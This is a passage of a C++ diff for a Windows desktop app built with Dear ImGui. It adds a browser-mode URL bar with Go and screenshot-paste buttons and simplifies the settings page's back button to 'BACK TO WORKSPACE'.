+            float pasteBtnW = (!g_screenshots.empty()) ? 76.0f : 0.0f;
+            float goBtnW = 32.0f;
+            float fixedW = 24.0f + 4.0f + 24.0f + 4.0f + 24.0f + 6.0f + 4.0f + goBtnW + (pasteBtnW > 0 ? (6.0f + pasteBtnW) : 0.0f);
+            float totalW = ImGui::GetWindowWidth() - 24.0f; // 12px margin each side
+            float urlBarW = totalW - fixedW;
+            if (urlBarW < 80.0f) urlBarW = 80.0f;
+
+            ImGui::SetNextItemWidth(urlBarW);
+            bool urlActive = (g_currentFocus == FocusState::BrowserUrl);
+            if (urlActive) {
+                ImGui::PushStyleColor(ImGuiCol_Border, GetAccentColorU32(0.9f));
+                ImGui::PushStyleVar(ImGuiStyleVar_FrameBorderSize, 1.0f);
+            } else {
+                ImGui::PushStyleColor(ImGuiCol_Border, IM_COL32(50, 56, 70, 160));
+                ImGui::PushStyleVar(ImGuiStyleVar_FrameBorderSize, 1.0f);
+            }
+            if (!urlActive && !g_browserDisplayUrl.empty()) {
+                g_browserUrlBuffer = g_browserDisplayUrl;
+            }
+            char urlBuf[1024];
+            strncpy(urlBuf, g_browserUrlBuffer.c_str(), sizeof(urlBuf) - 1);
+            urlBuf[sizeof(urlBuf) - 1] = '\0';
+            if (ImGui::InputTextWithHint("##browser_url_input", "Search or enter URL...", urlBuf, sizeof(urlBuf), ImGuiInputTextFlags_EnterReturnsTrue)) {
+                g_browserUrlBuffer = urlBuf;
+                BrowserNavigate(g_browserUrlBuffer);
+            }
+            if (ImGui::IsItemClicked()) {
+                g_currentFocus = FocusState::BrowserUrl;
             }
             ImGui::PopStyleVar();
+            ImGui::PopStyleColor();
+
+            ImGui::SameLine(0, 4.0f);
+            ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(g_uiColor.x * 0.25f, g_uiColor.y * 0.25f, g_uiColor.z * 0.25f, 0.9f));
+            ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(g_uiColor.x * 0.40f, g_uiColor.y * 0.40f, g_uiColor.z * 0.40f, 1.0f));
+            if (ImGui::Button("Go##nav_go", ImVec2(goBtnW, 24.0f))) {
+                BrowserNavigate(g_browserUrlBuffer);
+            }
+            ImGui::PopStyleColor(2);
+
+            // Paste Screenshot button
+            if (!g_screenshots.empty()) {
+                ImGui::SameLine(0, 6.0f);
+                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(g_uiColor.x * 0.35f, g_uiColor.y * 0.35f, g_uiColor.z * 0.35f, 1.0f));
+                if (ImGui::Button("Paste Shot##nav_paste", ImVec2(pasteBtnW, 24.0f))) {
+                    PostMessage(g_hwnd, WM_USER + 3, 0, 0);
+                }
+                ImGui::PopStyleColor();
+            }
+
+            ImGui::PopStyleVar(2);
+        }
+
+        // Set cursor below the header
+        ImGui::SetCursorPos(ImVec2(12.0f, currentHeaderH + 6.0f));
+
+        if (g_appState == AppState::Login) {
+            RenderLoginPage(done);
         }
         else {
             if (g_showSettings) {
                 RenderSettingsPage();
-                ImGui::SetCursorPosY(ImGui::GetWindowHeight() - 60.0f);
-                const char* backLabel = "BACK TO CHAT";
-                if (g_appMode == AppMode::Agent) backLabel = "BACK TO AGENT";
-                else if (g_appMode == AppMode::Interview) backLabel = "BACK TO INTERVIEW";
-                else if (g_appMode == AppMode::Browser) backLabel = "BACK TO BROWSER";
-                else if (g_appMode == AppMode::Duel) backLabel = "BACK TO DUAL";
-                if (NeoWaveButton(backLabel, { ImGui::GetContentRegionAvail().x, 40.0f })) {
+                ImGui::SetCursorPosY(ImGui::GetWindowHeight() - 50.0f);
+                if (NeoWaveButton("BACK TO WORKSPACE", { ImGui::GetContentRegionAvail().x, 38.0f })) {
                     g_showSettings = false;
                     if (g_appMode == AppMode::Browser) {
                         ShowBrowserMode();
@@ -8019,7 +8873,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                         BrowserTimerExit();
                         HideBrowserMode();
                     }
-                    // Exiting Duel mode
                     if (g_prevAppMode == AppMode::Duel && g_appMode != AppMode::Duel) {
                         DeactivateDuelMode();
                         g_duelResponse = "";
@@ -8030,7 +8883,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                         ShowBrowserMode();
                         BrowserTimerEnter();
                     }
-                    // Entering Duel mode
                     if (g_appMode == AppMode::Duel && !g_duelModeActive) {
                         ActivateDuelMode();
                     }
